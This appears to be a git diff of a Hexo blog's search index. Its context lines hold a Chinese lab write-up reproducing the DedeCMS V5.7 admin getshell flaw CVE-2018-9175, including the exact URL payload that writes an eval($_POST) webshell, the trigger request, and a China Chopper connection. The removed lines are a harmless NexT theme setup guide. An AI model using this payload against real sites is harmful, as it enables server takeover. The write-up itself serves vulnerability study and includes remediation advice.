@@ -15,11 +15,11 @@
 <p>查看源码，找到漏洞</p>
 </blockquote>
 <p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
-<p><img src="???url" alt="sys_1.php"></p>
-<p><img src="???url" alt="sys_2.php"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_1.php"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_2.php"></p>
 <p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
 <p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
-<p><img src="??url" alt="sys_3.php"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??url" alt="sys_3.php"></p>
 <blockquote>
 <p>写入SHELL并触发</p>
 </blockquote>
@@ -27,21 +27,21 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>
 
 <p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
-<p><img src="url" alt="1_payload"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="1_payload"></p>
 <p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
-<p><img src="url" alt="2_inc"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="2_inc"></p>
 <p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>
 
-<p><img src="url" alt="3_shell"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="3_shell"></p>
 <blockquote>
 <p>中国菜刀添加SHELL</p>
 </blockquote>
-<p>很简单吧！嘻嘻嘻！ <img src="??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
-<p><img src="url" alt="4_caidao.1"></p>
-<p><img src="url" alt="4_caidao.2"></p>
+<p>很简单吧！嘻嘻嘻！ <img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.1"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.2"></p>
 <p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="url" alt="bq2"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq2"></p>
 <p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
 <p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
 <p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
@@ -50,7 +50,7 @@
 <p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
 <p>3.及时打补丁，更新补丁。</p>
 <h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
-<p><img src="url" alt="bq3"></p>
+<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq3"></p>
 <p><a href="balabalabbbbbba....">参考链接</a></p>
 ]]></content>
       <categories>
@@ -59,177 +59,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo博客搭建之NexT主题美化</title>
-    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
-
-<h3 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h3><p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
-<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
-
-<p>到此，NexT 主题安装完成，下一步将验证主题是否正确启用。在切换主题之后、验证之前，最好使用 <code> hexo clean</code> 来清除 Hexo 的缓存。</p>
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
-<p><code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code></p>
-<p>此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。</p>
-<p>当站点的外观与下图所示类似时即说明已成功安装 NexT 主题。这是 NexT 默认的 Scheme —— Muse .</p>
-<p><img src="/images/next.jpg" alt="NexT 主题界面"></p>
-<h2 id="主题设定"><a href="#主题设定" class="headerlink" title="主题设定"></a>主题设定</h2><p>对于默认主题用起来有点不顺手，可以进行一些简单的设定改变主题的模样。</p>
-<h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>Scheme 是 NexT 提供的一种特性，借助于 Scheme，NexT 为你提供多种不同的外观。同时，几乎所有的配置都可以 在 Scheme 之间共用。目前 NexT 支持三种 Scheme，他们是：</p>
-<ul>
-<li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>
-<li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li>
-<li>Pisces - 双栏 Scheme，小家碧玉似的清新</li>
-<li>Gemini - Pisces 的改进版本，分块明确</li>
-</ul>
-<p>Scheme 的切换通过更改 <span class="label success">主题配置文件</span> ，搜索 <code>scheme</code> 关键字，将需用启用的 scheme 前面注释 <code>#</code> 去除即可。</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 将 <code>language</code> 设置成所需要的语言，例如选用简体中文，配置如下：</p>
-<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h3><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标，NexT 使用的是 FontAwesome 提供的图标。</p>
-<p>默认的 Next 主题样式中只包含首页和归档这两个链接，可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>menu</code> 字段来新增更多页面菜单。 其设置格式是 <code>item name: link || icon</code> ：<br>    - item name ：是一个名称，这个名称并不直接显示在页面上，用于匹配图标以及翻译<br>    - link ：菜单链接<br>    - icon ：表示所用的 <code>FontAwesome</code> 图标名称</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>
-
-<p>以上设置的菜单的名称并不直接用于界面上的展示，而是查找其对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/&#123;language&#125;.yml</code> 中（ <code>&#123;language&#125;</code> 为你所使用的语言）。</p>
-<p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code> 。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code> ，在 <code>menu</code> 字段下添加一项：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/languages/zh-Hans.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">公益404</span></span><br><span class="line">  <span class="attr">something:</span> <span class="string">有料</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="设置侧栏"><a href="#设置侧栏" class="headerlink" title="设置侧栏"></a>设置侧栏</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># position: left  # 靠左放置</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span>   <span class="comment"># 靠右放置</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure>
-
-<p>修改 <code>sidebar.display</code> 的值(只针对 Muse | Mist 主题)，支持的选项有：</p>
-<ul>
-<li>post - 默认行为，在文章页面（拥有目录列表）时显示</li>
-<li>always - 在所有页面中都显示</li>
-<li>hide - 在所有页面中都隐藏（可以手动展开）</li>
-<li>remove - 完全移除</li>
-</ul>
-<h3 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a>设置头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/xin.jpg</span>   <span class="comment"># 头像图片放置在themes/next/source/images目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span> <span class="comment"># 鼠标放在头像上时是否旋转</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>  <span class="comment"># 头像是否设为圆形，否则为矩形</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="设置作者昵称及站点描述"><a href="#设置作者昵称及站点描述" class="headerlink" title="设置作者昵称及站点描述"></a>设置作者昵称及站点描述</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 设置 <code>author</code> 为作者昵称，设置 <code>description</code> 字段为站点描述,可以是喜欢的一句签名:)</p>
-<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">xinkjung&#x27;s</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27; Be happy. &#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>安装好的默认主题是很简洁的，很多信息和配置都需要手动来进行修改。</p>
-<h3 id="添加标签-分类页面"><a href="#添加标签-分类页面" class="headerlink" title="添加标签/分类页面"></a>添加标签/分类页面</h3><span class="label default">标签</span> 页面将展示站点的所有标签，若你的所有文章都未包含标签，此页面将是空的。
-
-<span class="label default">分类</span> 页面将展示站点的所有分类，若你的所有文章都未包含分类，此页面将是空的。 
-
-<p>在终端窗口下，定位到 Hexo 站点目录下，新建一个页面，命名为 <code>tags</code> / <code>categories</code> ： </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories </span><br></pre></td></tr></table></figure>
-
-<p>这时会发现 <code>source</code> 目录下出现了 <code>tags</code> 、 <code>categories</code> 两个文件夹，编辑文件夹内的 <code> index.md</code> 文件：</p>
-<figure class="highlight yml"><figcaption><span>source/tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight yml"><figcaption><span>source/categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
-
-<div class="note info">
-            <p><i class="fa fa-info-circle"></i> 这里要注意确保在主题配置文件的 menu 字段中添加了 tags 和 categories 页面</p>
-          </div>
-
-<h3 id="添加腾讯公益-404"><a href="#添加腾讯公益-404" class="headerlink" title="添加腾讯公益 404"></a>添加腾讯公益 404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><figcaption><span>source/404/index.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com/404/search_children.js&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">&quot;回到我的主页&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/data.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/page.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<div class="note info">
-            <p><i class="fa fa-info-circle"></i> 主题配置文件的 menu 字段中已经包含了 commonweal：/404/ ，直接在 menu 字段添加就可以了</p>
-          </div>
-
-<h3 id="添加-about-页面"><a href="#添加-about-页面" class="headerlink" title="添加 about 页面"></a>添加 about 页面</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight yml"><figcaption><span>source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">About</span> <span class="string">Me</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-07-30 18:45:37</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">xinkjung&#x27;s</span> <span class="string">blog!</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/menu.png" alt="菜单栏效果预览"></p>
-<h3 id="设置代码高亮-复制"><a href="#设置代码高亮-复制" class="headerlink" title="设置代码高亮/复制"></a>设置代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># 显示代码复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  <span class="comment"># 展示复制结果</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="设置侧边栏社交"><a href="#设置侧边栏社交" class="headerlink" title="设置侧边栏社交"></a>设置侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:xinkjung@163.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://instagram.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># 是否显示社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>    <span class="comment"># 是否只显示社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>    </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/sidebar.png" alt="侧栏效果预览"></p>
-<h3 id="开启打赏功能"><a href="#开启打赏功能" class="headerlink" title="开启打赏功能"></a>开启打赏功能</h3><p>越来越多的平台（微信公众平台，新浪微博，简书，百度打赏等）支持打赏功能，付费阅读时代越来越近，特此增加了打赏功能，支持微信打赏和支付宝打赏。 只需要 <span class="label success">主题配置文件</span> 中填入 <code>微信</code> 和 <code>支付宝</code> 收款二维码图片地址即可开启该功能:</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">请我喝杯奶茶吧～</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/reward.png" alt="打赏效果预览"></p>
-<h3 id="设置底部布局"><a href="#设置底部布局" class="headerlink" title="设置底部布局"></a>设置底部布局</h3><p>站点建立时间可以在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span>   <span class="comment"># 图标是否闪烁</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#D3D3D3&quot;</span>   <span class="comment"># 图标颜色，这里是亮灰色</span></span><br><span class="line">  <span class="attr">copyright:</span>    <span class="comment"># 如果不设置，将会默认显示站点作者名称</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>  <span class="comment"># true  # 是否显示 Powered by Hexo &amp; NexT</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/footer.png" alt="底部效果预览"></p>
-<h2 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h2><p>进行了一些基础配置之后感觉还不是很完美，于是又有了下面这些进阶设置。</p>
-<h3 id="自定义网站图标"><a href="#自定义网站图标" class="headerlink" title="自定义网站图标"></a>自定义网站图标</h3><p>博客的默认图标是 <code>N</code> ，不过 NexT 支持修改图标，博客网站的图标可以在 <a href="https://www.iconfont.cn/">iconfont</a> 网站选择，然后选择或者创建相应大小的图标文件，放置在 <code>themes/next/sources/images</code> 目录下，并在 <span class="label success">主题配置文件</span> 中进行如下配置（只需要设置 <code>small</code> 和 <code>medium</code> 两个就可以）：</p>
-<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/16x16.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/32x32.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/128x128.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/star.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/icon.png" alt="图标效果预览"></p>
-<h3 id="添加数据统计"><a href="#添加数据统计" class="headerlink" title="添加数据统计"></a>添加数据统计</h3><p>不蒜子统计的引入很好的方便了设置阅读次数和访客数，可以在 <span class="label success">主题配置文件</span> 中进行如下设置：</p>
